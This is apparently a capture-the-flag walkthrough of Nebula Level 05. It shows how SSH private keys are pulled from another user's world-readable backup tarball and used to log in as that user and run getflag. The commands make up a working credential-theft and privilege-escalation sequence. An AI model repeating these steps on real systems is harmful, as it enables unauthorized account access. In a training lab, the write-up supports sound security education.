title: "Nebula Series - Level 05"
---

*Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
system race conditions.*

**Level 05** reminds us to lock down our backups

Ok, so the first thing to understand is that you need to secure your backups. The instructions for this level suggest we keep an eye out for weak permissions. Easy enough, let's
take a look at the target user's home directory

```bash
level05@nebula:~$ ls -l
total 0
```

At first glance it doesn't seem like there's anything there but if we include the `-a` flag to list
hidden files (aka dotfiles) we see some interesting directories:

```bash
level05@nebula:~$ ls -la
total 9
drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw------- 1 flag05 flag05    23 2020-04-27 20:02 .bash_history
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
drwx------ 2 flag05 flag05    60 2020-04-27 20:02 .cache
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

That `.backup` looks promising -- it's readable by anyone -- let's see what was backed up.

```bash
level05@nebula:~$ ls -la /home/flag05/.backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

A tarball... whats it hold? We can use `tar` with `-t` to list the files in an archive and `-f` to
specify which archive

```bash
level05@nebula:~$ tar -tf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

There they are! The keys to the castle! Let's extract them to a new `/flag05keys` directory in our
home. Here, `-x` indicates we want to extract the files, `-v` enables verbose output, `-f`
again identifies the archive we're working with, and `-C` allows us to specify where the extracted
files should go. tar won't create the directory for us though so we run `mkdir ~/flag05keys` first.

```bash
level05@nebula:~$ mkdir ~/flag05keys && tar -xvf /home/flag05/.backup/backup-19072011.tgz -C ~/flag05keys
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

Let's check that the public key is the same as the one in `.ssh/authorized_keys`

```bash
level05@nebula:~$ diff ~/flag05keys/.ssh/authorized_keys ~/flag05keys/.ssh/id_rsa.pub
```

No output indicates these files are identical. That means, if this "backup" is an accurate
representation of our target's `.ssh`, we can connect as flag05 over `ssh` by providing this private
key with `-i`

```bash
level05@nebula:~$ ssh -i ~/flag05keys/.ssh/id_rsa flag05@localhost

Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

flag05@nebula:~$
```

It worked! Now that we're user `flag05`, we can run `getflag` and move on.

```bash
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

In Summary:

- Security is about the weakest link -- protect your backups
